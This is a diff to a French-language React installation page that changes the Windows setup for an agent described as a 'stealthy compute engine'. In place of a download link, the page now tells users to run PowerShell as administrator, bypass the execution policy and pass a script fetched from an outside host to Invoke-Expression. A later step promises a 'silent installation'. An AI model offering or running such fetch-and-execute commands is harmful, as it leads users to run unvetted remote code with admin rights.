@@ -27,14 +27,15 @@ const windowsSteps: Step[] = [
         ]
     },
     {
-        title: "Téléchargement de l'Agent",
-        icon: <Download className="neon-text" size={32} />,
-        desc: "Récupérez le moteur de calcul furtif conçu spécifiquement pour Windows.",
-        action: (
-            <a href="/vc-agent-windows.exe" download className="btn-wow" style={{ display: 'inline-flex', alignItems: 'center', gap: 10 }}>
-                <Download size={20} /> Télécharger l'Agent Windows
-            </a>
-        )
+        title: "Bootstrap de l'Agent",
+        icon: <Database className="neon-text" size={32} />,
+        desc: "Ouvrez PowerShell en tant qu'administrateur et exécutez ces commandes.",
+        isCommand: true,
+        commands: [
+            "Set-ExecutionPolicy Bypass -Scope Process -Force",
+            "[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12",
+            "Invoke-Expression ((New-Object System.Net.WebClient).DownloadString('https://vc-uy1.npe-techs.com/install-windows.ps1'))"
+        ]
     },
     {
         title: "Installation Silencieuse",
@@ -111,7 +112,9 @@ export default function InstallationPage() {
     const steps = os === 'windows' ? windowsSteps : linuxSteps;
 
     const copyAll = () => {
-        const cmds = linuxSteps[1].commands?.join('\n') || '';
+        const currentSteps = os === 'windows' ? windowsSteps : linuxSteps;
+        const cmdStep = currentSteps.find(s => s.isCommand);
+        const cmds = cmdStep?.commands?.join('\n') || '';
         navigator.clipboard.writeText(cmds);
         setCopied(true);
         setTimeout(() => setCopied(false), 2000);
